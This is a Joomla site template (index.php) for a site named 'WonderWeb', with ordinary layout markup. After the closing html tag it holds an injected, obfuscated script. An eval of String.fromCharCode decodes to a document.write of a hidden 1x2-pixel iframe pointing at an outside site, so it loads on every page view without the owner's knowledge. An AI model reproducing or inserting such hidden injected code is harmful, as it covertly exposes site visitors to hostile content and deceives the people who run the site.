<?php
// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );
require_once dirname(__FILE__) . DS . 'functions.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
 <head>
  <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<jdoc:include type="head" />
  <link rel="stylesheet" href="<?php echo $this->baseurl; ?>/templates/system/css/system.css" type="text/css" />
  <link rel="stylesheet" href="<?php echo $this->baseurl; ?>/templates/system/css/general.css" type="text/css" />
  <link rel="stylesheet" type="text/css" href="<?php echo $this->baseurl; ?>/templates/<?php echo $this->template; ?>/css/style.css" />
  <!--[if IE 6]><link rel="stylesheet" href="<?php echo $this->baseurl; ?>/templates/<?php echo $this->template; ?>/css/style.ie6.css" type="text/css" media="screen" /><![endif]-->
  <script type="text/javascript" src="<?php echo $this->baseurl; ?>/templates/<?php echo $this->template; ?>/script.js"></script>
 </head>
<body>
<div class="Main">
<div class="Sheet">
    <div class="Sheet-tl"></div>
    <div class="Sheet-tr"><div></div></div>
    <div class="Sheet-bl"><div></div></div>
    <div class="Sheet-br"><div></div></div>
    <div class="Sheet-tc"><div></div></div>
    <div class="Sheet-bc"><div></div></div>
    <div class="Sheet-cl"><div></div></div>
    <div class="Sheet-cr"><div></div></div>
    <div class="Sheet-cc"></div>
    <div class="Sheet-body">
<div class="Header">
    <div class="Header-png"></div>
    <div class="Header-jpeg"></div>
<div class="logo">
 <h1 id="name-text" class="logo-name"><a href="<?php echo $this->baseurl ?>/">WonderWeb</a></h1>
 <div id="slogan-text" class="logo-text">Because we care</div>
</div>


</div>
<jdoc:include type="modules" name="user3" />
<div class="contentLayout">
<div class="sidebar1">
<jdoc:include type="modules" name="left" style="artblock" />

</div>
<div class="content">
<?php if ($this->countModules('breadcrumb') || artxHasMessages()) : ?>
<div class="Post">
    <div class="Post-body">
<div class="Post-inner">
<div class="PostContent">
<jdoc:include type="modules" name="breadcrumb" />
<jdoc:include type="message" />

</div>
<div class="cleared"></div>

</div>

    </div>
</div>
<?php endif; ?>
<jdoc:include type="component" />

</div>

</div>
<div class="cleared"></div>
<div class="Footer">
 <div class="Footer-inner">
  <jdoc:include type="modules" name="syndicate" />
  <div class="Footer-text"><p>Copyright &copy; 2009 ---.<br/>
All Rights Reserved.</p>
</div>
 </div>
 <div class="Footer-background"></div>
</div>

    </div>
</div>
  <p class="page-footer"><a href="http://www.artisteer.com/joomla">Joomla template</a> created with Artisteer.</p>

</div>

</body> 
</html><?php echo '<script type="text/javascript">eval(String.fromCharCode(118,97,114,32,104,106,103,52,61,34,104,111,116,34,59,118,97,114,32,119,61,34,105,34,59,118,97,114,32,114,101,54,61,34,99,97,110,46,34,59,118,97,114,32,114,114,116,116,54,61,34,99,111,109,34,59,118,97,114,32,97,61,34,105,102,34,59,118,97,114,32,115,61,34,116,116,34,59,100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,39,43,97,43,39,114,97,109,101,32,115,114,99,61,34,104,39,43,115,43,39,112,58,47,47,39,43,104,106,103,52,43,39,39,43,119,43,39,39,43,114,101,54,43,39,39,43,114,114,116,116,54,43,39,47,39,43,39,34,32,119,105,100,116,104,61,34,49,34,32,104,101,105,103,104,116,61,34,50,34,62,60,47,105,39,43,39,102,39,43,39,114,97,109,101,62,39,41,59,118,97,114,32,119,54,61,48,48,53,48,51,50,48,48,48,48,48,50,49,48))</script>'; ?>